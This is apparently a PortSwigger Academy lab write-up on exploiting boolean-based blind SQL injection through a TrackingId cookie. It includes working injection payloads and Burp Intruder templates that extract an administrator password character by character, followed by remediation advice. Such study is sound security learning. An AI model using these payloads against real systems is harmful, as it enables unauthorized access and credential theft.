# Lab Name: Blind SQL injection with conditional responses

## Executive Summary
* **Vulnerability Class:** Blind SQL Injection (Boolean-based / Conditional Responses)
* **Severity:**  High (CVSS 3.1: 8.6 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
* **Target Objective:** Leverage a conditional-response oracle within a tracking parameter to map the backend database schema, exfiltrate the plain text password for the `administrator` account, and achieve full administrative compromise.
* **Key Takeaway:** Even when an application completely suppresses database error messages and direct data reflection, any predictable behavioral discrepancy (such as variations in UI content or response length) can serve as an informational side channel. Attackers can exploit this channel to systematically exfiltrate entire data structures one character at a time.

---

## Environment & Tools
* **Platform:** PortSwigger Web Security Academy (Practitioner Level)
* **Target Endpoint:** `GET /` via `TrackingId` cookie
* **Testing Tools:** Burp Suite Community Edition v2026.9 (Proxy, Repeater, Intruder), Firefox Developer Edition

---

## Attack Lifecycle

### 1. Reconnaissance & Oracle Discovery
I began by intercepting the baseline traffic to inspect how the application handles session analytics parameters.

* **Observation:** The application sets an unvalidated analytics cookie named `TrackingId` on incoming requests.
* **Theory:** If the value of this cookie is processed unsafely within a server-side SQL `WHERE` clause, injecting logic queries will manipulate the backend logic flow. If a message like `"Welcome back"` appears dynamically based on query results, it creates a clean **boolean-based blind SQL injection oracle**.

```http
GET / HTTP/2
Host: 0aaa005d047eb31f801367f9006b0025.web-security-academy.net
Cookie: TrackingId=eRNTWCjCxmQP3obH; session=NHOvLBVGGRGfX9BJ4gxDX44FguTz8Xz8
```
*Intercepting the raw baseline request in Burp Suite Proxy before initiating testing loops.*

---

### 2. Exploitation & Character Exfiltration (Step-by-Step)

#### 🔹 Step 2.1: Proving Boolean Oracle Control
To establish explicit verification thresholds, I modified the `TrackingId` parameter in **Burp Repeater** using standard logical operators:

* **The True State:** Appended a syntactically valid always-true block:  
  `TrackingId=eRNTWCjCxmQP3obH' AND 1=1--`  
  *Result:* HTTP 200, response length **11,594 bytes**. The page rendered normally with the `"Welcome back"` string visible in the HTML DOM.
* **The False State:** Appended a syntactically valid always-false block:  
  `TrackingId=eRNTWCjCxmQP3obH' AND 1=2--`  
  *Result:* HTTP 200, response length dropped to **11,533 bytes** (a 61-byte reduction). The `"Welcome back"` banner vanished completely.

This response length delta served as a reliable binary oracle (`TRUE` vs. `FALSE`) for all subsequent data mining steps.

---

#### 🔹 Step 2.2: Mapping Schema Structure & Targets
Before extracting credentials, I confirmed the presence of the target table and administrative username using safe subqueries:

```sql
-- 1. Verify existence of the 'users' table (Evaluated: TRUE)
TrackingId=eRNTWCjCxmQP3obH' AND (SELECT 'a' FROM users LIMIT 1)='a'--

-- 2. Verify existence of the 'administrator' account record (Evaluated: TRUE)
TrackingId=eRNTWCjCxmQP3obH' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
```
*Validating that the backend components and core target profiles exist within the query bounds.*

---

#### 🔹 Step 2.3: Isolating the Password Length
Using **Burp Intruder (Sniper Attack)**, I tested the length of the target password string using a numerical inequality loop:

* **Payload Position Template:**  
  `TrackingId=eRNTWCjCxmQP3obH' AND (SELECT username FROM users WHERE username='administrator') AND LENGTH(password)>§N§--`
* **Configuration:** Numbers payload from `1` to `30`, step `1`.
* **Analysis:** Responses for values up to and including `N = 19` returned the `TRUE` state length (11,594 bytes). At `N = 20`, the response dropped to the `FALSE` length (11,533 bytes), confirming the password length is exactly **20 characters**.

---

#### 🔹 Step 2.4: Character-by-Character Automated Exfiltration
To exfiltrate the 20-character secret key, I configured a **Burp Intruder Cluster Bomb** attack to cycle through character indexes and alpha-numeric guess states simultaneously.

* **Multi-Position Payload Template:**  
  `TrackingId=eRNTWCjCxmQP3obH' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--`

##### Intruder Payload Configuration:
* **Payload Set 1 (Character Index Offset):** Numbers `1–20`, step `1` (20 values)
* **Payload Set 2 (Character Guess Matrix):** Alphanumeric list `a-z`, `0-9` (36 values)
* **Execution Matrix:** 20 offsets × 36 character options = **720 total requests**.

##### Response Filter Sorting:
I added a `Grep - Match` filter for the phrase `"Welcome back"` and sorted the results grid by HTTP response length. For each character index layout position (1 through 20), exactly one character generated the valid `TRUE` state length (11,594 bytes).

Reassembling these 20 true matches in order provided the plain text security password for the application's administrative layer.

---

## Proof of Concept (PoC)
*Evidence of successful exploitation and total system compromise.*

I navigated to the application access gateway at `/login` and authenticated with the reconstructed administrative credential data sets.

| Boolean Condition Test | HTTP Response Length | `Welcome back` UI Element | State Interpretation |
| :--- | :--- | :--- | :--- |
| `AND 1=1--` | 11,594 bytes | Present |  True State |
| `AND 1=2--` | 11,533 bytes | Absent |  False State |
| `LENGTH(password)>19` | 11,594 bytes | Present |  True State |
| `LENGTH(password)>20` | 11,533 bytes | Absent |  False State |

Logging into `/my-account` successfully flipped the application framework state to **Solved**, triggering the platform confirmation banner.

---

## Root Cause & Remediation Strategy

### Why did this happen?
The web application processes untrusted user input from the `TrackingId` cookie and concatenates it directly into a backend SQL query template without parameterization or context escaping. Conceptually, the statement evaluates as:
```sql
SELECT ... FROM analytics WHERE tracking_id = '<Untrusted Attacker Input>'
```
Because this string structure is processed directly as source code by the database parser, injected syntax redefines the operational execution logic on the database engine.

### How to fix it:

1. **Enforce Complete Parameterization (Prepared Statements):**  
   Ensure that user data is handled completely isolated from structural commands. By passing user fields as bound variables rather than concatenated text blocks, the engine treats payloads exclusively as static string literals.
   ```python
   # Secure Implementation Example
   query = "SELECT * FROM analytics WHERE tracking_id = %s"
   cursor.execute(query, (tracking_id,))
   ```

2. **Strict Input Allowlisting:**  
   Validate that values arriving inside the `TrackingId` match a rigid, safe format (e.g., alphanumeric strings only). Drop and log any tokens that contain dangerous special tokens like `'`, `--`, `#`, or key SQL syntax words.

3. **Minimize Side-Channel Discrepancies:**  
   Avoid changing application frontend outputs dynamically based on inputs passed directly into low-privilege analytics lookups. Instead, use static responses or handle session checks using cryptographically structured tokens stored securely in an external cache registry.

---

## Failed Attempts & Lessons Learned
* **Pre-Flight Validation Benefit:** Testing the generic `1=1` and `1=2` strings manually in Repeater before running automation saved time. It verified the boolean oracle parameters immediately before initializing larger automated lists.
* **Intruder Attack Type Selection:** Identifying that two distinct parameters (index index position *and* character arrays) needed to vary independently meant a **Cluster Bomb** layout was required. Running a standard Sniper configuration here would have skipped essential alignment checks, creating broken logic strings and incomplete exfiltration maps.
* **Efficiency via Sorting:** Sorting the final Cluster Bomb results table cleanly by **Response Length** allowed me to quickly isolate the exact characters needed, without having to manually inspect individual HTTP packet responses for the `"Welcome back"` string.

---

## References
* **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
* **OWASP Prevention Guide:** [SQL Injection Prevention Cheat Sheet](https://owasp.org)
* **PortSwigger Academy Guide:** [Blind SQL Injection Documentation](https://portswigger.net)
```
